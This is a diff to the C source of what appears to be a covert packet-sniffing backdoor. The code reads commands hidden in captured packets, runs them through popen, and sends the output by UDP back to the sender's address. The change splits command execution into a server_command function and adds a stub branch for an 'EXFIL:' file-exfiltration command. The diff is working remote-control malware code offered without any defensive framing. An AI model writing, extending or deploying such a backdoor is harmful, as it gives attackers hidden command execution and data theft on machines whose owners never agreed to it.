@@ -494,6 +494,41 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         return;
     }
     
+    /* Prepare address */
+    
+    struct sockaddr_in dst_host;
+    
+    memset(&dst_host, 0, sizeof(struct sockaddr_in));
+    dst_host.sin_family = AF_INET;
+    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
+
+    if(packet_info.ip->ip_p == IPPROTO_UDP){
+        dst_host.sin_port = packet_info.udp->uh_sport;
+    }
+    else if(packet_info.ip->ip_p == IPPROTO_TCP){
+        dst_host.sin_port = packet_info.tcp->th_sport;
+    }
+    
+    /* Handle command */
+    
+    // If file exfil command
+    if(strncmp(bd_command,"EXFIL:",6) == 0){
+        printf("EXFIL");
+    }
+    else{ // Normal command
+        server_command(bd_command, &dst_host);
+    }
+    
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Execute command
+| ------------------------------------------------------------------------------
+*/
+
+void server_command(char *bd_command, struct sockaddr_in *dst_host){
+    
     /* Execute command */
     
     FILE *fp;
@@ -508,29 +543,16 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     
     // Open UDP socket
     int sockfd;
-    struct sockaddr_in dst_host;
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     int arg = 1;
     if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
         system_fatal("setsockopt");
     
-    memset(&dst_host, 0, sizeof(struct sockaddr_in));
-    dst_host.sin_family = AF_INET;
-    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
-
-    if(packet_info.ip->ip_p == IPPROTO_UDP){
-        dst_host.sin_port = packet_info.udp->uh_sport;
-    }
-    else if(packet_info.ip->ip_p == IPPROTO_TCP){
-        dst_host.sin_port = packet_info.tcp->th_sport;
-    }
-    
-    
     // Send results from popen command
     char output[BD_MAX_REPLY_LEN];
     memset(output, 0, BD_MAX_REPLY_LEN);
     fread((void *)output, sizeof(char), BD_MAX_REPLY_LEN, fp);
-    sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)&dst_host, sizeof(dst_host));
+    sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)dst_host, sizeof(struct sockaddr_in));
     printf("Sent results back to client.\n");
     
     /* Cleanup */
